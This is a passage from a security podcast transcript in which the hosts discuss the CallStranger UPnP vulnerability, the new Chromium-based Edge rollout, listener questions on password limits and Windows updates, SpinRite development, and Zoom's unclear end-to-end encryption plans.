So in that case, the NAT router is a problem.  We're going to solve that by creating a new protocol that runs on everybody's router called Universal Plug and Play.  It's got nothing to do with plug and play, which allowed you to plug in a USB into your Windows machine and have it be recognized, or plug in other things and be like, oh, look, there it is.  Something just appeared.  Let's talk to it.  No.  They called it UPnP due to an apparently critical shortage of imagination when they were trying to name this thing.  So this is a LAN-side server that allows anything on your LAN to say, basically, defeat the firewall which your NAT router is inherently to allow incoming unsolicited stuff on some port to go to that device that has said "Send me your unwashed packets that arrive at this port, and I want them."



So the problem is there's no security because you can't have any security because then it wouldn't be automatic.  It wouldn't be Universal Plug and Play, it'd be, oh, one more thing I have to configure.  And how do I tell my light switch how to receive packets from China?  Well, you may not want it to; now it can.  And of course the standing advice on this podcast has long been "Turn it off, everybody.  Just say no to Universal Plug and Play."



To make matters worse, some really ill-begotten UPnP services on routers decide, let's not just restrict this to the LAN.  Let's open it up to the WAN.  Let's let everybody have this service from this IP.  Oh, lord.  And as I noted, 54,954 people who thought, huh, I wonder if I'm doing that.  They went to ShieldsUP!.  They clicked the instant UPnP test.  Oh, yes, sure enough, they've got an open port 1900 on their IP.  Oh, well.  This is the world we're in today.



Okay.  So the good news is this current CallStranger bug is not, maybe not a public exposure problem, except maybe it is.  Nothing is clear.  And so UPnP is not supposed to be publicly exposed.  And we also know that it's not just our router that offers UPnP.  Lots of printers do, and other things like cameras.  Anything that wants to offer a service, this is sort of the universal, "Hi, I'm here to serve stuff."  So remember SSDP is Simple Service Discovery Protocol.  SSDP is what UPnP offers, Simple Service Discovery Protocol.



So this CallStranger thing is a problem which has been discovered in most current UPnP implementations.  Windows 10 has the problem.  And that means almost certainly all Windows versions including all of Windows servers.  That's the upnphost.dll.  Xbox One has the problem.  Devices from ASUS, Belkin, Broadcom, Canon, Cisco, D-Link, Epson, HP, Huawei, NEC, Philips, Samsung, TP-Link, TrendNet, and Zyxel.  And those are just the ones that have been tested so far.  There are doubtless others.  The good news is there is at least one known UPnP stack, "miniupnp," which after 2011 has not been vulnerable.  So not absolutely everything is.  But apparently lots are.



CERT's title for this is probably the most sane.  They said:  "Universal Plug and Play (UPnP) SUBSCRIBE" - in all caps because that's the verb used - "can be abused to send traffic to arbitrary destinations."  Their vulnerability disclosure says:  "A vulnerability in the UPnP SUBSCRIBE capability permits an attacker to send large amounts of data to arbitrary destinations accessible over the Internet, which could lead to a Distributed Denial of Service, data exfiltration, and other unexpected network behavior.  The OCF" - which is the organization that maintains the UPnP spec.  "The OCF has updated the UPnP specification to address this issue.  This vulnerability has been assigned CVE-2020-12695," because that's just how the year's gone so far, 12,695 CVEs, and we're not halfway through.  And they said:  "This is also known as CallStranger."



Okay.  So there are two problems.  By far the largest problem, because it affects potentially all UPnP hosting devices on a LAN, and remember as I said that would include our routers and printers and probably anything similar that offers services, so perhaps even LAN-attached IP cameras and so on, is that to do their job they're exposing LAN-facing servers, UPnP servers.  And it's this server in which a highly prevalent problem has been found.  So I don't mean to minimize that.  Not at all.  I'm hoping that they're not also publicly exposed.  None should be.



But so it's important that this is all LAN-facing.  In other words, an attacker needs to already have some foothold inside the network to be able to abuse this internal LAN side, LAN-facing aspect of UPnP.  I think it is widespread, but it's an internal issue.  And so that's why, in all this coverage, we do see references to DLP, Data Loss Prevention, because now one of the things that enterprises are doing is they have this DLP, Data Loss Prevention technology which is explicitly there to catch inadvertent exfiltration of the corporate golden goodies.  What happens is this problem, this SUBSCRIBE flaw, allows these UPnP devices, and there may be many in a corporate environment, to be turned into a proxy and used to route an attacker's exfiltration traffic out from the Intranet onto the Internet.  So that's bad.  But again, it only happens with an attacker who's already behind the firewall.



On the other hand, remember those problems that we ran across where people on the Internet, external, outside, were able to print something on a printer?  Well, that meant that from the outside they were able to get onto a printer, and a printer is on the LAN.  And a printer is almost certainly a Universal Plug and Play hosting device.  So there's that.  So the related question is what about the WAN-facing Interface of UPnP devices?  That's what I enhanced ShieldsUP! back then to detect.  But that was only one specific vulnerable aspect of Universal Plug and Play.  What no one has made clear is whether this SUBSCRIBE vulnerability exists on the WAN-facing side of UPnP devices.  And if it does, what would that allow attackers to do?



In the best case, attacks would be limited to using the exposed UPnP device for various forms of reflection attacks.  In the worst case, it would allow a remote attacker to probe through the device and into the LAN behind it.  But at this point there's no clarity about that.  Among the potential problems created by this, the researcher does state, he says:  "Scanning internal ports from Internet-facing UPnP devices."  So that's certainly not good.  And Shodan is still showing lots of Internet-facing UPnP devices.



And as I mentioned, ShieldsUP!, if you are a user of ShieldsUP!, you can take the instant UPnP test.  And it won't tell you about this, but it will tell you about the problem before.  And if I weren't really busy with SpinRite, I would enhance the test.  But I'm sure that will happen without me, elsewhere, soon.  I don't even know that this is a big problem.  But the LAN vulnerability side is clearly a problem for IT departments.  End-users, maybe not so much.  Again, something bad has to already be in, in order for that to take advantage of the LAN-facing side.



But to help with determining that, the researcher who found the problem has posted a Python-based vulnerability scanner on GitHub.  I've got the link in the show notes.  He explains that the script performs a series of actions:  finds all UPnP devices on the LAN; finds all UPnP services being offered by those devices; finds all subscription endpoints on those services; then sends these endpoints, encrypted, to a verification server via the UPnP Callback.  And then he says:  "Servers can't see the endpoints because all encryption is done on the client side.  Then this gets the encrypted service list from the verification server and decrypts on the client side, compares the found UPnP services with verified ones."



So to me this is a little bit unclear.  But I was a bit disturbed by the line "Sends these endpoints, encrypted, to a verification server via UPnP Callback," and "Server can't see the endpoints because all encryption is done on client side."  That may be true, but assuming that the server is on the public Internet, it certainly does see the public IP that's sending it those queries.  Since this was somewhat disturbing, I decided to fire the script up on my own network this morning to see what was going on.



Upon running it, I received, and I have it in the show notes, first it posts Stranger Host:  http://20.42.105.45, which is certainly not my IP, or any of mine.  So that is an IP out on the public Internet.  Stranger Port:  80.  So he set up an HTTP web server, apparently to field the encrypted results of this client, this Python client.  Then he says:  "No UPnP device found.  Possible reasons:  You just connected to network."  No.  "The UPnP stack is too slow.  Restart the script."  Probably not.  "UPnP is disabled on OS."  Very likely.  "UPnP is disabled on devices."  Very likely.  "There is no UPnP supported device."  Okay.  "Your OS works on VM with NAT configuration."  No.  My OS is directly connected.



So as I said, the Stranger Host line does indeed appear to indicate that anyone running this script will be sending stuff to that public IP.  But even so, my results appeared to all be negative.  Since I was assembling this podcast, I didn't want to spend too much time digging into this, but I was skeptical that my network had zero UPnP devices.  So I enabled the UPnP service on my FreeBSD-based pfSense firewall.  And I ran a different UPnP scanner.  It found a UPnP service there on pfSense and provided a truly disturbing amount of information about what it could see.  But again, it's on the internal side.



Among that information was the happy news that pfSense does use the miniupnp implementation that, as I said earlier, is known to be unaffected by this flaw.  But as I noted, I always had that UPnP server turned off anyway.  I then reran the Python script, and it still found nothing.  So I'm kind of unimpressed so far.  But given the truly horrifying example this guy has posted on GitHub of what his script might put out for somebody in a corporate environment, it might still be worth running.  Or maybe it'll turn out that it's possible to do all this locally, as I strongly suspect is probably the case.



So maybe we should just wait for an update of the script that sets up a local server and does it locally because people are not going to like sending this off to some random IP on the Internet, basically a vulnerability report of their internal network.  Maybe not.  He says it's all encrypted.  Okay.  I don't know what that means.  But anyway, it's in Python.  So the source is there.  I just, you know, I did this this morning, and I didn't want to take too much time on it.



So where does this leave us?  It leaves us where we always find ourselves after something like this.  Our networks have connected devices, many of which will likely never be fixed.  None of the known problems are critical enough to force us to disconnect them from the 'Net.  But we're left with a mild discomfort that things are not as secure as we would like them to be.  The lesson this continues to reinforce is that anything that connects needs to have a means for being updated as problems in it are discovered.  Everything should have some sort of home, and everything should periodically phone that home to connect for any important updates.  In other words, updating is every bit as important as connecting.  One should not happen without the other.  We're not there today, but that's where we need to aim.



So this sounds like a protocol-level problem.  The protocol is being updated.  The common wisdom here would be to look for updates to your router firmware.  And Microsoft, apparently this is a problem in Windows 10.  So they'll be fixing that.  And, I mean, every other router on Earth apparently is currently affected.  pfSense isn't.  That's nice.  Anything that is miniupnp-based isn't.  I noted that DD-WRT isn't there.  Maybe they're also using miniupnp.  I don't know.  But I'm sure more information will be emerging over time.  I'll keep our readers informed.



So Microsoft has started to replace the old Edge with the new Edge.  We've been waiting for that to be happening for quite a while.  I have Edge on my Win7 machine, and I do think it's a nice browser.



LEO:  You like it?



STEVE:  Yeah.  Yeah.  I mean, Chromium.  It's a nice implementation.  And they really - Microsoft really does seem to be focused on adding lots of features.  I've got it because I can't wait for the vertical tabs to happen, in which case I will play with those.  So everyone using Windows 10 1803 or later will be seeing this appear.  It's being rolled out under their Knowledge Base number 4559309.  And it will replace the original Edge browser on Win10 2004, 1909, 1903, 1809, 1803.  As I was looking at this I was thinking, and isn't it unifying that we only have one Windows 10 now.  It's like, uh-huh.  Right.



So interestingly, whereas the original Edge could be removed, Microsoft says:  "The new Microsoft Edge does not support removal."  And they seem to be getting a little more strict about this.  Also:  "The current version of Microsoft Edge," they said, "will be hidden from UX surfaces in the OS."  The current version.  So for some reason they don't want to be showing - maybe they're worried that the numbers are getting too big, you know, because they're tracking Chromium's versioning, and it's like, you know, 84, 85.  It's like, okay.



Anyway, they said:  "This includes settings, applications, and any file or protocol support dialog boxes; and attempts to start the current version of Microsoft Edge will redirect to the new Microsoft Edge."  So they're just really pushing it aside, the old one.  Of course all previous user data from earlier Microsoft Edge versions - passwords, bookmarks, open tabs, et cetera - will be moved over into the new Edge.  So people may notice, oh, look, it sort of feels a little more crisp than the old one did.



But anyway, also separately, there was also some reporting that I saw, but it didn't rise to the level of a bullet point here, that the Win10 Start Menu had begun advertising the new Edge whenever anyone appeared to be searching for information about any other web browser.  I very much like the idea of a Chromium-based Edge, and I suppose it's Microsoft's right to push whatever they wish to since they own the platform.  But it certainly doesn't give me or any who are reporting on this the warm fuzzies.



But speaking of warm fuzzies, we have some listener feedback.  Luis Cruz tweeted:  "Barring the ability to transfer your consciousness to a new vessel, do you have a plan for SpinRite and your other work after you are incapable of maintaining it?  Will it go open source?  Are you mentoring Gibson 2.0 behind the scenes to pick it up?"



LEO:  That's a good question.



STEVE:  It is a good question.  And no, I will give it to the world.  I will - I don't know what I'll do.  Create a GitHub account.  Actually, I have one.  I just never put anything there.



LEO:  Of course, by then there'll be no one who knows how to write in assembly code, so...



STEVE:  That's true.  Well, it'll be a curio.  It'll be like the Apollo 11 code, Leo.



LEO:  Yeah, exactly.  Look how much he did with so few, so few lines.



STEVE:  Oh, look at that.  Five instructions and it talks, yeah.  So anyway, I do.  I have thought about it.  Once I am no longer in a mode where I'm maintaining the code, it's like, why not?  I mean, some of it embarrasses me.  Some of it is like lots of evolution and stuff.  But, you know, when you get older, Leo, I think that's one of the things that happens.  You know, Gramps is kind of hard to embarrass now.



LEO:  Yeah.



STEVE:  So that'll be okay.  Skynet, he's @fairlane32 is his Twitter handle, he says:  "Hi, Steve.  In Episode 769" - so that was last week - "with automatic downloads in Chrome, you have the option of choosing 'Ask every time' under Chrome's settings.  Wouldn't that prevent the drive-by downloads on sites?"  And I said, yes, good point.  But it turns out it's not the default, and it's a bit buried.  You've got to go to Privacy & Security, and it's not there.  Then you've got to go to Advanced because, yes, turning off drive-by downloads is advanced security.  But there's a toggle there.  I did it, and sure enough, my Chrome is no longer surreptitiously downloading things.  It now prompts me.  It's a little jarring, actually.  I was like, what?  Oh, yeah.  Well, I did tell it I wanted it to ask me.  So I'm happy for that.  And you're right, Skynet, it is there.



Chris Rhodus tweeted:  "Hi, Steve.  Over the years I've heard you say that there is no reason to limit the maximum size of a password."  Yes, I was just ranting about it last week.  "I'm currently reviewing a vendor design document that has the password max limit set to 32 characters.  Are there any case studies or other documents you can point me to that can be used to justify the removal of the 32-character limit?  I don't think the vendor will be happy about removing the max limit.  I will need to justify the removal of the imposed limit if any opposition is encountered.  Thanks."



So Chris, no.  I know of no studies.  And frankly, 32 characters, you know, unless they're all lowercase "a," it's probably pretty good.  And in fact, even if they are all lowercase "a," well, no, I guess somebody could probe to see that there was a 32-character limit, and then try 32 a's.



LEO:  That'd be the first thing you'd try.



STEVE:  Yeah.  But the point is - and that's a good point.  If there is a limit, then it is a probeable limit.  And that does help somebody doing brute-force guessing.



LEO:  Right.  That's a little weak, yeah.



STEVE:  So there's something.



LEO:  But any rules, any password rules help in that regard.



STEVE:  Yes.  That is exactly right.  Maybe that's, well, I was going to say maybe that's why you don't complain until they submit one that breaks a rule.  Then you tell them the rule.  But on the other hand, that allows it to be probed.



LEO:  Right, right.



STEVE:  So I don't know.  I mean, this is a mess.  Part of my SQRL spiel is that usernames and passwords is the way I logged into a Hazeltine terminal when I was at Berkeley in 1973, and we're still doing it now.  What is wrong?  But, yeah.  So Chris, I wouldn't upset them.  You want them to like you.  There's nothing wrong with 32 characters.  That's a lot of entropy.  If you actually use 32 characters of entropy, that's more than the 256-bit hash that you will reduce that to; right?  So that allows as much entropy as, well, actually it's the same; isn't it.  32 bytes is 256 bits.  So it's the same, it is the same amount of entropy as if you were to use all bytes in 32 bits.  Is it 32?  Yeah, it is.  So, yeah, that's a lot of entropy.  It's enough.  So anyway...



LEO:  So ones where it's limited to eight characters, you've got to really start to worry about them.



STEVE:  Yeah.



LEO:  And there are those.



STEVE:  There are.  Twelve, you know, not good.  There you suspect they're still running - maybe they purchased the mainframe from CompuServe.  And, you know, that's not good.



Ed McKiver says:  "Steve, just passing a note to add to other comments you might be getting.  My Dell laptop auto-updated to Win10 release 2004.  Ever since, my computer has been running EXTREMELY SLOW [all caps], and sometimes clicking on Windows items or right-clicking menu takes minutes to come up.  Went into Settings to check for updates, and the Settings window crashed during the check before finishing.  Second attempt completed okay, but other items like View Update History is taking forever to display.  Click and wait and wait and wait is the order of the day now."



He says:  "I have 150GB of free space on my hard drive.  My laptop tends to slow down when I get under 100GB left."  Okay.  Now, just let's stop there.  What is wrong with this picture?  Anyway:  "But it's always worked normally with at least 100GB of free space."  Good to know.  "Thought I'd put in my two cents for stopping all this major release stuff to Windows, if they are constantly going to be breaking stuff."



He says:  "Oh.  Settings window just crashed again as it was just trying to View Update History."  He says:  "I can't even roll back at this point.  FYI, Ed in Redlands, and SpinRite owner since Version 1."  So Ed, thank you.  And I think you can probably do - can't you intercept the boot with F6 and get it there, maybe, to roll you back?  I don't know.  What a mess.



Speaking of a mess, Leo, I have two grc.sc shortcuts to share.  These will take users to endcoronavirus.org/states and /countries, respectively.  And in case people forget that, grc.sc/states, grc.sc/countries.  I really like these two pages because they are all in one place thumbnails.  In fact, what you put on the screen right now is really kind of cool.  It's a map of the U.S. where the shape of each state is filled with a tiny chart of known coronavirus infections for that state.  And they're red when they are not doing so well; green when they've got it under control.



But you can also scroll down and get a divided-by - they show green, yellow, and red with larger historical graphs.  And it's just cool because it's a very quick, at-a-glance style, you know, where do we stand by state, and then the grc.sc/countries is where do we stand by relative countries.  And in fact you can see down - there you are in the red now.  There are some real problems.  Arizona has had a really precipitous spike.  So has Alabama.  It's necessary also to take a look at their absolute number because these are all scaled relative to themselves and not based on the absolute number.  So in some cases, you know, when you get some crazy lift-off, yeah, it went from one to five, so whoa, five times.  But, yeah.  Not that big a problem in absolute terms.  But it is just sort of a neat site.  I just wanted to share it with our listeners.



I don't have a lot of exciting news to share on the SpinRite project.  Probably I'll have more next week.  We found a few remaining problems with the FAT partitions I was creating, in the size of their root directories.  I had to tweak that since my own, you know, I wrote my own partition formatter from scratch so that I would have ultimate flexibility for the future.  And there was a little debris to shake loose.  We have some people who have created batch files to create uniquely named files until it crashes in order to torture test these partitions that I've created, and they are now passing with flying colors.  So I thank those listeners in our newsgroup.  And that's all fixed and has been torture tested.



It was suggested that we needed to further failsafe or add a failsafe means for selecting the drive whose contents we are about to permanently wipe out and destroy through a destructive reformatting.  So I added the technology with the utility I'm creating that's called InitDisk.  And it watches all of the system's drives, asks the user to confirm the drive they wish to blow away by physically removing and replacing it.  And that worked quite well.



But it worked so well that I then wanted to see how it would be if we used that as the only means for specifying the drive we want to reformat and use because there were some problems.  If you put a stick in, a USB drive that, for example, had been over on a Mac and only had a GPT format and a partition that wasn't recognized by Windows, it wouldn't assign a drive letter.  So you weren't able to use a drive letter to point to the drive you wanted to reformat.  Anyway, I'm currently working on using pure physical insertion as the means of specifying the drive.  It'll tell you all about the drive, and then you'll confirm that that's the one you want to reformat.



And it also turns out that there are some drives - for a while Microsoft was requiring USB drive vendors to have their drive declare itself fixed, rather than removable, in order to be certified under Windows 8.  SanDisk was apparently the vendor that immediately jumped on that.  And so there's a period of time when they were making USB drives that, when you stuck them in, they said they were fixed.  Well, I had a prevention of only allowing removable drives because I didn't want there to be no possibility that a user could inadvertently reformat one of the fixed drives they had in their computer.



Well, it turns out that wasn't reliably useful because of this weird Windows 8 certification issue that went by.  So now we're just going to use, you know, prove to me by inserting it that this is the one you want to use, with then follow-on verification.  So that'll be done probably tomorrow, and then we'll be moving forward again.  So anyway, working on this project, and we're getting a lot done there.



Okay.  Zoom's end-to-end encryption debacle.  Yes, just when everything appeared to be going so well, the day after our podcast last week which, as we all know, celebrated the quite rational and well-supervised planned evolution of Zoom's security architecture, during a call with financial analysts to discuss Zoom's latest financial results, CEO Eric Yuan  confirmed that Zoom won't be offering end-to-end encryption on free accounts.  What?



So Eric was widely reported to have said, and I quote from multiple sources:  "Free users, for sure, we don't want to give that [end-to-end encryption] because we also want to work it together with FBI and local law enforcement, in case some people use Zoom for bad purpose."  Oh, boy.



So not surprisingly, my Twitter feed lit up with our listeners asking whether I had seen this latest from Zoom, and many saying that no way are they going to be using it from now on.  To give everyone a sense for the industry's reaction to this revelation, The Verge headline:  "Zoom says free users won't get end-to-end encryption so FBI and police can access calls."  The Guardian:  "Zoom to exclude free calls from end-to-end encryption to allow FBI cooperation."  Engadget:  "Zoom explains why free users won't get end-to-end encrypted video calls."



USA Today, so it's even out of the tech press:  "Zoom CEO:  No end-to-end encryption for free users so company can work with law enforcement."  The Next Web:  "Zoom won't encrypt free calls because it wants to comply with law enforcement."  Tech Crunch:  "Zoom faces criticism for denying free users end-to-end encryption."  And I could keep going, but you all get the idea.



The problem, of course, is that this is seen as purely a profit motivated policy, since strong end-to-end encryption is desirable, and only paying customers can get it.  And the argument about compliance with law enforcement, well, what?  So you want to allow Zoom to comply with law enforcement except if people pay for the service.  In which case Zoom's newer and better end-to-end encryption will explicitly not allow for any compliance with law enforcement.



Okay.  So you're making money by marketing your hostility to law enforcement.  Of course we've seen that before.  That's the stance that Apple has explicitly and loudly taken.  But Apple's encryption is ubiquitous.  Apple doesn't allow anyone to not have full end-to-end encryption on any of their person-to-person connections - text, voice, or video.



So of course I was as stunned as anyone by this news, especially given the mature supervision that Zoom was apparently now receiving.  But the CEO had spoken, and on this he seemed quite unambiguous.  So I thought I'd reach out to Alex Stamos to see what he might know.  I brought him up in TweetDeck and discovered that he follows me on Twitter.  So that meant I could DM him directly and hopefully not be lost in the noise.  I shot Alex a DM to make sure that he was aware of this mess.



And then I continued poking around and quickly discovered that he was quite well aware indeed.  He had posted a series of tweets Tuesday, the previous day, that attempted to repair the damage.  But frankly, they only further complicated things.  I have a link in the show notes to his Twitter stream, which is not too long, so I'm going to share it because it just demonstrates, what?



So here's what he said.  Alex Stamos tweeted:  "Some facts on Zoom's current plans for E2E encryption, which are complicated by the product requirements for an enterprise conferencing product and some legitimate safety issues."  Next tweet:  "All users, free and paid, have their meeting content encrypted using a per-meeting AES-256 key.  Content is encrypted by the sending client and decrypted by receiving clients or by Zoom's connector servers to bridge into the phone network or other services."  Okay, so far that sounds like everything's encrypted.  He says "all users, free and paid."



Then he says:  "Zoom does not proactively monitor content in meetings and will not in the future.  Zoom doesn't record meetings silently.  Neither of these will change.  Our goal is to offer an end-to-end encrypted solution that provides a stronger guarantee.  Zoom is dealing with some safety issues. When people disrupt meetings, sometimes with hate speech, CSAM" - whatever that is - "exposure to children, and other illegal behaviors, that can be reported by the host."  Right, because they're in the meeting.  "Zoom is working with law enforcement on the worst repeat offenders."  Good.



"Making it possible for hosts to report people disrupting their meetings even under end-to-end encryption is solvable."  Yeah, we've talked about that.  "The likely solution will be a content ring-buffer of the last X seconds on the host's system that can be submitted to Zoom for triage and action."  That's entirely reasonable.  That's the host does that from within the cone of silence.



"The other safety issue," he tweets, "is related to hosts creating meetings that are meant to facilitate really horrible abuse.  These hosts mostly come in from VPNs, using throwaway email addresses, create self-service orgs, and host a handful of meetings before creating a new identity.  Zoom's Trust and Safety team can, if they have a strong belief that the meeting is abusive, enter the meeting visibly and report it if necessary."  Okay, that's new.



He says:  "As you see from the E2E design, there is a big focus on authenticating both the people and the devices involved in end-to-end meetings.  If properly implemented, this would prevent Zoom's employees from entering a meeting, even" - okay, wait, now.  "As you see from the E2E design," he says, "there's a big focus on authenticating both the people and the devices involved in end-to-end meetings.  If properly implemented, this would prevent Zoom's employees from entering a meeting, even visibly.  There will not be a backdoor to allow this."  Okay.  So sounds like we're talking about straddling technology.  Currently, or until this is properly implemented, Zoom can do this.  They won't be able to in the future with a proper implementation.



He says:  "Zoom's E2EE implementation will need to be opt-in for the foreseeable future.  A large portion of Zoom's meetings use features that are fundamentally incompatible with end-to-end encryption - telephones, SIP phones, room systems, cloud recordings, cloud transcription, streaming to YouTube, et cetera.  So we have to design the system to securely allow hosts to opt into an end-to-end meeting and to carefully communicate the security guarantees to hosts and attendees.  We are looking at ways to upgrade to E2E once a meeting has started, but there will be no downgrades.



"So this creates a difficult balancing act for Zoom, which is trying to both improve the privacy guarantees it can provide while reducing the human impact of the abuse of its product.  Lots of companies," he says, "are facing this balancing act; but as a paid enterprise product that has to offer end-to-end encryption as an option due to legitimate product needs, Zoom has a slightly different calculus.  The current decision by Zoom's management is to offer end-to-end encryption to the business and enterprise tiers, but not to the limited, self-service free tier."  He says that's the current decision by Zoom's management is business and enterprise tiers, but not to the limited, self-service free tier.



He says:  "A key point:  Organizations that are on a business plan, but are not paying due to a Zoom offer, like schools, will also have free end-to-end encryption.  Will this eliminate all abuse?" he asks in his tweet?  "No, but since the vast majority of harm comes from self-service users with fake identities, this will create friction and reduce harm.  This," he tweets, "is a hard balance.  Zoom has been actively seeking input from civil liberties groups, academics, child safety advocates, and law enforcement.  Zoom hopes to find a common ground between these equities that does the most good for the most people."  Good luck with that.



He finishes with three final points:  "One, most of the people I interact with know this, but I've been working with Zoom as a consultant and helped with the E2E design.  Two, none of the major players offer E2E by default - Google Meet, Microsoft Teams, Cisco Webex, BlueJeans."  He says:  "Webex has an E2E option for enterprise users only, and it requires you to run the PKI [Public Key Interface] and won't work with outsiders.  Any E2E shipping with Zoom will be groundbreaking.  Three, at no time does Zoom turn over encryption keys to law enforcement.  The issue here is whether Zoom's own employees can enter spaces they host."  Wait, the employees host?



LEO:  Zoom hosts.



STEVE:  I don't know who "they" mean.



LEO:  But Zoom has the keys, in other words.  "They" meaning Zoom.



STEVE:  Well, elsewhere he also said they don't.



LEO:  So how would he hand them to law enforcement if they didn't have them?



STEVE:  He says:  "At no time does Zoom turn over encryption keys to law enforcement."  Oh, meaning they have them, but they don't hand them over.



LEO:  They have them.  They don't hand them over.  And that's why employees could listen to any meetings Zoom hosts.



STEVE:  So he says:  "The issue here is whether Zoom's own employees can enter spaces they" - he doesn't say who "they host" is.



LEO:  Zoom.



STEVE:  He says "they host."



LEO:  Zoom.



STEVE:  Is that...



LEO:  Yeah.



STEVE:  So because Zoom's hosting all Zoom meetings.



LEO:  Right.



STEVE:  Okay.



LEO:  Employees don't host meetings.



STEVE:  Right.  Well, right.  But we had this notion earlier that the host of the meeting could report bad activity.  And that's fine.



LEO:  Right.  So who cares what Zoom employees' meetings can or can't do.



STEVE:  Right.



LEO:  That's not really any issue.



STEVE:  Okay.  So he posted all that on the 2nd.  Two days later, on Thursday the 4th, it was contradicted by a Zoom spokesperson who confirmed that free users will be covered by Zoom's AES-256 GCM encryption, but chats will not be covered by additional end-to-end protections.  So the official Zoom spokesperson said:  "Zoom's AES-256 GCM encryption is turned on for all Zoom users, free and paid.  Zoom does not proactively monitor meeting content, and we do not share information with law enforcement except in circumstances like child sex abuse."



LEO:  Yeah, they have the key.  Right.



STEVE:  "We do not have backdoors where participants can enter meetings without being visible to others.  None of this will change.  Zoom's end-to-end encryption plan balances the privacy of its users with the safety of vulnerable groups, including children and potential victims of hate crimes."



LEO:  Inherently, they just said two completely incompatible things.



STEVE:  I know.  Exactly.



LEO:  Okay.



STEVE:  "We plan to provide end-to-end encryption to users for whom we can verify identity, thereby limiting harm to these vulnerable groups.  Free users sign up with an email address, which does not provide enough information to verify identity.  The current decision by..."



LEO:  It's not unreasonable, I think.



STEVE:  "The current decision by Zoom's management is to offer end-to-end encryption to business and enterprise tiers.  We are determining the best path forward for providing end-to-end encryption to our Pro users.  Zoom has engaged with child safety advocates, civil liberties organizations, encryption experts, and law enforcement to incorporate their feedback into our plan.  Finding the perfect balance is challenging.  We always strive to do the right thing."  So in my show notes here I said, uh, okay.  So today we still have no idea what they intend.



LEO:  They got the headlines they wanted, though, didn't they.



STEVE:  They did.  They are clearly asked, over and over, do you or do you not encrypt all Zoom video?  And they answer, "Right."



LEO:  Good one.  Yeah, that's right.



STEVE:  Uh-huh.  Uh-huh.  You got it.



LEO:  Yeah, yeah, [crosstalk].



STEVE:  Do you or don't you?  Right.



LEO:  Right.



STEVE:  If you have been listening carefully, yes.  Yes what?  Uh-huh.  But Leo, I have no idea.



LEO:  We don't know what they're doing.



STEVE:  None whatsoever.



LEO:  It's unclear.  And Stamos didn't clear it up.



STEVE:  No.  His is as bad as the official spokesperson.  And they end with, yeah, this is hard.  Yeah.  Okay.  Sorry.



LEO:  I don't - I think, you know, I didn't have the same reaction a lot of people did to this idea of encrypt for paid users, but not for unpaid users, because it's pretty clear an unpaid user can use an account without proof of personality.



STEVE:  Yes.  Yes.



LEO:  So it would have been better had they said we'll encrypt, but only for people who prove their identity, give us identity, so that we can chase down malefactors because that's been a problem on our platform.  But they're not even saying that.  It's completely unclear.  Basically they can give law - it sounds like they can give law enforcement anything because they have the keys.



STEVE:  And they're saying, I mean, Alex said it and the spokesperson said it.  Encryption is turned on for free and paid.  And then, but not so much.



LEO:  And what?  Huh?



STEVE:  So maybe everything's encrypted, but unless you pay they hold the key?  I don't...



LEO:  It sounds like they have the key to everything.  That's what it sounds like.



STEVE:  Yeah.



LEO:  In which case this whole thing was FUD of Eric Yuan saying, "Well, we want to be able to have law enforcement tap the unpaid members."  Well, they can tap all of them because, if Zoom has the keys, they just give you a warrant.  Maybe they aren't going to ask for a warrant on the - maybe that's it.  It's just not clear what they're saying.



STEVE:  That's a mess.  So thank you for clearing that up.



LEO:  Yeah.  And this actually leads me to kind of - this is more to me of the same obfuscation and hand waving they've been doing for years.  And it really - I am liking them less and less.  They bought the best names in security, but it doesn't sound like they did much with it.



STEVE:  No.



LEO:  But that's just my personal opinion because we don't know.



STEVE:  Yeah.  I mean, and if the design that we discussed last week is actually implemented, then that would be good.  But now it looks like no one is sure.  Even Alex said "if it's implemented correctly."



LEO:  Right.



STEVE:  He gave himself kind of, oh, so wait.  It might not be?



LEO:  He's not doing the implementation.



STEVE:  No.



LEO:  Nobody, none of these big names they hired is implementing.  They wrote that nice paper.  And then they said, "Here, Zoom.  We deliver this to you.  You go to your Chinese programmers and make it so."  And that's, I mean, we're done.  We're done here.  I'm sure they all got a ton of money.  I honestly - this does not reassure.



STEVE:  And that's why Alex, you could read him saying, "I hope you understand I'm just a consultant here."  You know?  Point number one at the end was he said:  "Most of the people I interact with know this, but I've been working with Zoom as a consultant and helped with the E2E design."  He's like saying, you know...



LEO:  I wrote that paper, yeah.



STEVE:  Yeah.



LEO:  You know, I'm also going to downgrade Alex Stamos a little bit here.  It was always a little weird that he left Yahoo because, he said, "They never told me about the billion-person breach."  Goes to Facebook, "They never told me about the Cambridge Analytica."  Goes to Zoom, "Well, it's not my implementation."  So it downgrades you, too, a little bit, Alex.  I expect a little better than that.  Oh, well.



STEVE:  So I felt it was important for our listeners...



LEO:  I'm glad, yeah.



STEVE:  ...to join me in FUD because, like, I don't know what, I mean, nothing could be less clear.  This, you know, I have no idea what they're doing now.



LEO:  I think it's intentionally obfuscated.  And don't forget the most important part of that statement, "Well, no one else does it, either."



STEVE:  Right.



LEO:  Right?  Well, what do you want?  No one else is doing it for free.



STEVE:  And if we did, it would be groundbreaking.  But, you know, maybe we won't.  Oh, okay.



LEO:  We have to do it in accordance with law enforcement and good practice.  They don't want to get in trouble with Bill Barr.  Honestly, how important is it that you have end-to-end encrypted video conferences?  If you're doing - I guess if you're doing, you know, you're a psychiatrist having sessions with a client, that would be pretty important.



STEVE:  It's got to be HIPAA-compliant in order to do that.



LEO:  Right.  Right.



STEVE:  And, now, here's the problem.  If you're an enterprise user, and you're doing transnational video conferencing, discussing trade secrets...



LEO:  There you go.



STEVE:  ...are you going to trust Zoom?  I'm not going to trust Zoom now.  No.  We're going to use some sort of - Lord knows what.  How do you do truly - you use FaceTime.



LEO:  It's hard to do, isn't it.  It's hard to do.  Point-to-point's easier than distributed.



STEVE:  Yeah.



LEO:  I'm so glad you brought this up.  And you've actually clarified my thinking because I didn't see this actual statement from them, which is bonkers.



STEVE:  I know.



LEO:  It's bonkers.  Okay.  Steve Gibson.  See, this is why we've really got - we've got to give him a medal.  But, yeah, some sort of a major award because, without him, I don't, you know, this stuff would go right by.  You certainly don't see any discussion of it in the mainstream media.  GRC.com, that's where Steve hangs his hat.  The Gibson Research Corporation's where SpinRite, the world's best hard drive recovery and maintenance utility is currently under construction, the new version.  Old version available.  Buy it now, you'll get in on the beta, the next version.



He also, of course, puts the podcast there.  He does a couple of things no one else does.  I don't.  16Kb versions, which sound a little like Thomas Edison on his phono disks.  But they're very small.  And that's their benefit for the bandwidth impaired.  There's also transcripts, the smallest yet.  And he pays good money to Elaine Farris to listen to our blather and write it all down perfectly.  So those are really useful.  They're also searchable, which makes it even more - that's really the best reason for it.



